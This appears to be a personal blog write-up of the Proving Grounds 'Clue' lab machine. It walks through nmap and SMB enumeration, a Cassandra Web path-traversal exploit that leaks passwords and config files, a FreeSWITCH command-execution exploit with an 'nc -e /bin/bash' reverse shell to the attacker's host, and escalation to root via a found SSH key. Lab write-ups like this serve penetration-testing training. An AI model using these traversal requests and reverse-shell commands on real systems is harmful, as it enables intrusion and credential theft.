---
layout: post
title:  "Write Up: Proving Grounds Practice - Astronaut"
date:   2024-07-26 16:32:31 -0400
categories: oscp proving-grounds
---

192.168.199.240
me - 192.168.45.213

PORT     STATE SERVICE          VERSION
22/tcp   open  ssh              OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 74:ba:20:23:89:92:62:02:9f:e7:3d:3b:83:d4:d9:6c (RSA)
|   256 54:8f:79:55:5a:b0:3a:69:5a:d5:72:39:64:fd:07:4e (ECDSA)
|_  256 7f:5d:10:27:62:ba:75:e9:bc:c8:4f:e2:72:87:d4:e2 (ED25519)
80/tcp   open  http             Apache httpd 2.4.38
|_http-title: 403 Forbidden
|_http-server-header: Apache/2.4.38 (Debian)
139/tcp  open  netbios-ssn      Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn      Samba smbd 4.9.5-Debian (workgroup: WORKGROUP)
3000/tcp open  http             Thin httpd
|_http-server-header: thin
|_http-title: Cassandra Web
8021/tcp open  freeswitch-event FreeSWITCH mod_event_socket
Service Info: Hosts: 127.0.0.1, CLUE; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1h19m17s, deviation: 2h18m35s, median: -43s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.9.5-Debian)
|   Computer name: clue
|   NetBIOS computer name: CLUE\x00
|   Domain name: pg
|   FQDN: clue.pg
|_  System time: 2024-07-25T18:43:52-04:00
| smb2-time: 
|   date: 2024-07-25T22:43:55
|_  start_date: N/A



looks like port 80 is a no-go currently (getting a 403 response) so we are going to table that for now. Also seeing Samba which could be fun but going to put a pin in that for now and try out http://192.168.199.240:3000/


nmap -v -p 139,445 --script smb-os-discovery 192.168.199.240

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-26 14:54 EDT
NSE: Loaded 1 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 14:54
Completed NSE at 14:54, 0.00s elapsed
Initiating Ping Scan at 14:54
Scanning 192.168.199.240 [2 ports]
Completed Ping Scan at 14:54, 0.04s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 14:54
Completed Parallel DNS resolution of 1 host. at 14:54, 13.00s elapsed
Initiating Connect Scan at 14:54
Scanning 192.168.199.240 [2 ports]
Discovered open port 445/tcp on 192.168.199.240
Discovered open port 139/tcp on 192.168.199.240
Completed Connect Scan at 14:54, 0.04s elapsed (2 total ports)
NSE: Script scanning 192.168.199.240.
Initiating NSE at 14:54
Completed NSE at 14:54, 2.38s elapsed
Nmap scan report for 192.168.199.240
Host is up (0.039s latency).

PORT    STATE SERVICE
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

Host script results:
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.9.5-Debian)
|   Computer name: clue
|   NetBIOS computer name: CLUE\x00
|   Domain name: pg
|   FQDN: clue.pg
|_  System time: 2024-07-26T14:54:05-04:00

NSE: Script Post-scanning.
Initiating NSE at 14:54
Completed NSE at 14:54, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 15.52 seconds



└─$  nmap -p 139,445 --script smb-vuln* 192.168.199.240
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-26 14:57 EDT
Nmap scan report for 192.168.199.240
Host is up (0.040s latency).

PORT    STATE SERVICE
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

Host script results:
|_smb-vuln-ms10-054: false
| smb-vuln-regsvc-dos: 
|   VULNERABLE:
|   Service regsvc in Microsoft Windows systems vulnerable to denial of service
|     State: VULNERABLE
|       The service regsvc in Microsoft Windows 2000 systems is vulnerable to denial of service caused by a null deference
|       pointer. This script will crash the service if it is vulnerable. This vulnerability was discovered by Ron Bowes
|       while working on smb-enum-sessions.
|_          
|_smb-vuln-ms10-061: false

Nmap done: 1 IP address (1 host up) scanned in 59.08 seconds




└─$ smbclient --no-pass -L //192.168.199.240

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        backup          Disk      Backup web directory shares
        IPC$            IPC       IPC Service (Samba 4.9.5-Debian)
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        WORKGROUP            




smbclient --no-pass //<IP>/<Folder>




smbget --recursive smb://192.168.199.240/backup


Downloaded backup, there is a ton of stuff in there, putting a pin in it for now


========================================================================================================================
┌──(kali㉿kali)-[~/…/smb-dl/freeswitch/etc/freeswitch]
└─$ searchsploit cassandra   
---------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                    |  Path
---------------------------------------------------------------------------------- ---------------------------------
Atrium Software Cassandra NNTP Server 1.10 - Buffer Overflow                      | windows/dos/19884.txt
Cassandra Web 0.5.0 - Remote File Read                                            | linux/webapps/49362.py
---------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results


└─$ searchsploit -m 49362.py
  Exploit: Cassandra Web 0.5.0 - Remote File Read
      URL: https://www.exploit-db.com/exploits/49362
     Path: /usr/share/exploitdb/exploits/linux/webapps/49362.py
    Codes: N/A
 Verified: False
File Type: Python script, ASCII text executable
Copied to: /home/kali/offsec/pg-practice/Clue/49362.py



┌──(kali㉿kali)-[~/offsec/pg-practice/Clue]
└─$ python3 exploit.py 192.168.199.240 /etc/passwd

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
ntp:x:106:113::/nonexistent:/usr/sbin/nologin
cassandra:x:107:114:Cassandra database,,,:/var/lib/cassandra:/usr/sbin/nologin
cassie:x:1000:1000::/home/cassie:/bin/bash
freeswitch:x:998:998:FreeSWITCH:/var/lib/freeswitch:/bin/false
anthony:x:1001:1001::/home/anthony:/bin/bash



┌──(kali㉿kali)-[~/offsec/pg-practice/Clue]
└─$ python3 exploit.py 192.168.199.240 /proc/self/cmdline
/usr/bin/ruby2.5/usr/local/bin/cassandra-web-ucassie-pSecondBiteTheApple330

cassie
SecondBiteTheApple330



└─$ python3 exploit.py 192.168.199.240 /etc/ssh/sshd_config

#AllowAgentForwarding yes
#AllowTcpForwarding yes
#GatewayPorts no
X11Forwarding yes
#X11DisplayOffset 10
#X11UseLocalhost yes
#PermitTTY yes
PrintMotd no
#PrintLastLog yes
#TCPKeepAlive yes
#PermitUserEnvironment no
#Compression delayed
#ClientAliveInterval 0
#ClientAliveCountMax 3
#UseDNS no
#PidFile /var/run/sshd.pid
#MaxStartups 10:30:100
#PermitTunnel no
#ChrootDirectory none
#VersionAddendum none

# no default banner path
#Banner none

# Allow client to pass locale environment variables
AcceptEnv LANG LC_*

# override default of no subsystems
Subsystem       sftp    /usr/lib/openssh/sftp-server

# Example of overriding settings on a per-user basis
#Match User anoncvs
#       X11Forwarding no
#       AllowTcpForwarding no
#       PermitTTY no
#       ForceCommand cvs server

AllowUsers root anthony


can't ssh in, only root and anothony soooooo.................

==========================================================================================================================

http://192.168.199.240:8021/

site wont load in browser but can telnet to the port so I know its open
┌──(kali㉿kali)-[~/offsec/pg-practice/Clue]
└─$ telnet 192.168.199.240 8021
Trying 192.168.199.240...
Connected to 192.168.199.240.
Escape character is '^]'.
Content-Type: auth/request

^]
telnet> q
Connection closed.

so lets check searchsploit

┌──(kali㉿kali)-[~/offsec/pg-practice/Clue]
└─$ searchsploit FreeSWITCH   
---------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                    |  Path
---------------------------------------------------------------------------------- ---------------------------------
FreeSWITCH - Event Socket Command Execution (Metasploit)                          | multiple/remote/47698.rb
FreeSWITCH 1.10.1 - Command Execution                                             | windows/remote/47799.txt
---------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results


auth fails for both default password in the exploit and the found password SecondBiteTheApple330

===================================================================================================================

FreeSWITCH is a free and open-source telephony software for real-time communication protocols using audio, video, text and other forms of media. The software has applications in WebRTC, voice over Internet Protocol (VoIP), video transcoding, Multipoint Control Unit (MCU) functionality and supports Session Initiation Protocol (SIP) features.[10] 

Going back through the configuration files I downloaded from samba:

```
┌──(kali㉿kali)-[~/…/freeswitch/etc/freeswitch/autoload_configs]
└─$ ls
abstraction.conf.xml         directory.conf.xml        modules.conf.xml            sndfile.conf.xml
acl.conf.xml                 distributor.conf.xml      mongo.conf.xml              sofia.conf.xml
alsa.conf.xml                easyroute.conf.xml        msrp.conf.xml               spandsp.conf.xml
amqp.conf.xml                enum.conf.xml             nibblebill.conf.xml         switch.conf.xml
amr.conf.xml                 erlang_event.conf.xml     opal.conf.xml               syslog.conf.xml
amrwb.conf.xml               event_multicast.conf.xml  opus.conf.xml               timezones.conf.xml
av.conf.xml                  event_socket.conf.xml     oreka.conf.xml              translate.conf.xml
avmd.conf.xml                fax.conf.xml              osp.conf.xml                tts_commandline.conf.xml
blacklist.conf.xml           fifo.conf.xml             perl.conf.xml               unicall.conf.xml
callcenter.conf.xml          format_cdr.conf.xml       pocketsphinx.conf.xml       unimrcp.conf.xml
cdr_csv.conf.xml             graylog2.conf.xml         portaudio.conf.xml          v8.conf.xml
cdr_mongodb.conf.xml         hash.conf.xml             post_load_modules.conf.xml  verto.conf.xml
cdr_pg_csv.conf.xml          hiredis.conf.xml          pre_load_modules.conf.xml   voicemail.conf.xml
cdr_sqlite.conf.xml          httapi.conf.xml           presence_map.conf.xml       voicemail_ivr.conf.xml
cepstral.conf.xml            http_cache.conf.xml       python.conf.xml             vpx.conf.xml
cidlookup.conf.xml           ivr.conf.xml              redis.conf.xml              xml_cdr.conf.xml
conference.conf.xml          java.conf.xml             rss.conf.xml                xml_curl.conf.xml
conference_layouts.conf.xml  kazoo.conf.xml            rtmp.conf.xml               xml_rpc.conf.xml
console.conf.xml             lcr.conf.xml              sangoma_codec.conf.xml      xml_scgi.conf.xml
curl.conf.xml                local_stream.conf.xml     shout.conf.xml              zeroconf.conf.xml
db.conf.xml                  logfile.conf.xml          skinny.conf.xml
dialplan_directory.conf.xml  lua.conf.xml              smpp.conf.xml
dingaling.conf.xml           memcache.conf.xml         sms_flowroute.conf.xml
                                                                                                                    
┌──(kali㉿kali)-[~/…/freeswitch/etc/freeswitch/autoload_configs]
└─$ cat event_socket.conf.xml
<configuration name="event_socket.conf" description="Socket Client">
  <settings>
    <param name="nat-map" value="false"/>
    <param name="listen-ip" value="::"/>
    <param name="listen-port" value="8021"/>
    <param name="password" value="ClueCon"/>
    <!--<param name="apply-inbound-acl" value="loopback.auto"/>-->
    <!--<param name="stop-on-bind-error" value="true"/>-->
  </settings>
</configuration>
                                                                                                                    
┌──(kali㉿kali)-[~/…/freeswitch/etc/freeswitch/autoload_configs]
└─$ 
```

Info about the config - https://developer.signalwire.com/freeswitch/FreeSWITCH-Explained/Modules/mod_event_socket_1048924/

hmmmmm so lets use that earlier exploit to double check to see what that password is set to:

┌──(kali㉿kali)-[~/offsec/pg-practice/Clue]
└─$ python3 exploit.py 192.168.199.240 -p 3000 /etc/freeswitch/conf/autoload_configs/event_socket.conf.xml

python3 exploit.py 192.168.199.240 -p 3000 ../../../../../../../../etc/freeswitch/autoload_configs/event_socket.conf.xml

curl --path-as-is http://192.168.199.240:3000/../../../../../../../../etc/freeswitch/autoload_configs/event_socket.conf.xml
┌──(kali㉿kali)-[~]
└─$ curl --path-as-is http://192.168.199.240:3000/../../../../../../../../etc/freeswitch/autoload_configs/event_socket.conf.xml
<configuration name="event_socket.conf" description="Socket Client">
  <settings>
    <param name="nat-map" value="false"/>
    <param name="listen-ip" value="0.0.0.0"/>
    <param name="listen-port" value="8021"/>
    <param name="password" value="StrongClueConEight021"/>
  </settings>
</configuration>



so the password is actually set to StrongClueConEight021, updated that in our RCE exploit

└─$ python3 exploit.py 192.168.199.240 'nc 192.168.45.213 3000'  ===========> no worky
└─$ python3 exploit.py 192.168.199.240 'nc 192.168.45.213 3000 -e /bin/bash'

Able to log in and su to cassie, from there I can check out the home dir and see shek can run sudo cassandra-web with no password

python -c 'import pty; pty.spawn("/bin/bash")'

```
ls
anthony
cassie
su cassie
SecondBiteTheApple330
id
uid=1000(cassie) gid=1000(cassie) groups=1000(cassie)
cd /home/cassie
ls
id_rsa
ls -asl
total 32
4 drwxr-xr-x 4 cassie cassie 4096 Aug 11  2022 .
4 drwxr-xr-x 4 root   root   4096 Aug  5  2022 ..
0 lrwxrwxrwx 1 root   root      9 Aug  5  2022 .bash_history -> /dev/null
4 -rw-r--r-- 1 cassie cassie  220 Apr 18  2019 .bash_logout
4 -rw-r--r-- 1 cassie cassie 3526 Apr 18  2019 .bashrc
4 drwx------ 3 cassie cassie 4096 Aug 11  2022 .gnupg
4 -rw------- 1 cassie cassie 1823 Aug 11  2022 id_rsa
4 -rw-r--r-- 1 cassie cassie  807 Apr 18  2019 .profile
4 drwx------ 2 cassie cassie 4096 Aug 11  2022 .ssh
cd .ssh
ls
known_hosts
cd ..
sudo -l
Matching Defaults entries for cassie on clue:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User cassie may run the following commands on clue:
    (ALL) NOPASSWD: /usr/local/bin/cassandra-web
```

Can try launching an alt of the site and as root and lets see if we can gain root access through that

```
cassandra-web -h
Usage: cassandra-web [options]
    -B, --bind BIND                  ip:port or path for cassandra web to bind on (default: 0.0.0.0:3000)
    -H, --hosts HOSTS                coma-separated list of cassandra hosts (default: 127.0.0.1)
    -P, --port PORT                  integer port that cassandra is running on (default: 9042)
    -L, --log-level LEVEL            log level (default: info)
    -u, --username USER              username to use when connecting to cassandra
    -p, --password PASS              password to use when connecting to cassandra
    -C, --compression NAME           compression algorithm to use (lz4 or snappy)
        --server-cert PATH           server ceritificate pathname
        --client-cert PATH           client ceritificate pathname
        --private-key PATH           path to private key
        --passphrase SECRET          passphrase for the private key
    -h, --help                       Show help
cassie@clue:/$ 
```
so lets try the following:
```
sudo cassandra-web -B 0.0.0.0:4444 -u cassie -p SecondBiteTheApple330
```

so we are now running on 9876

so if we run
```
curl --path-as-is http://192.168.199.240:9876/../../../../../../../../etc/passwd
```

it just hangs.... tried a couple other things and then remembered that random id stored under /home/cassie and pulled that down locally. Tried logging in as anthony and root since they are the only two that have ssh access and it worked for root.